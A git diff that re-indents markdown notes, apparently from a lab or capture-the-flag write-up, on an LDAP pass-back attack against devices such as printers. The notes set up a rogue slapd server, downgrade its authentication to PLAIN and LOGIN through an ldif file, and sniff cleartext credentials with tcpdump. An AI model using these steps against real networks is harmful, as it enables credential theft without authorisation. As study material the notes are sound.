@@ -106,14 +106,14 @@ This is a common attack against network devices, such as printers, when you have
 `sudo dpkg-reconfigure -p low slapd`  
 Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods.  
 we need to create a new ldif file.  
-```
-#olcSaslSecProps.ldif
-dn: cn=config
-replace: olcSaslSecProps
-olcSaslSecProps: noanonymous,minssf=0,passcred
-```  
-`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`  
+    ```
+    #olcSaslSecProps.ldif
+    dn: cn=config
+    replace: olcSaslSecProps
+    olcSaslSecProps: noanonymous,minssf=0,passcred
+    ```  
+    `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`  
 2. Capturing LDAP Credentials  
-you can use a tcpdump to capture the credentials using the following command:  
-`sudo tcpdump -SX -i breachad tcp port 389`  
+    you can use a tcpdump to capture the credentials using the following command:  
+    `sudo tcpdump -SX -i breachad tcp port 389`  
 
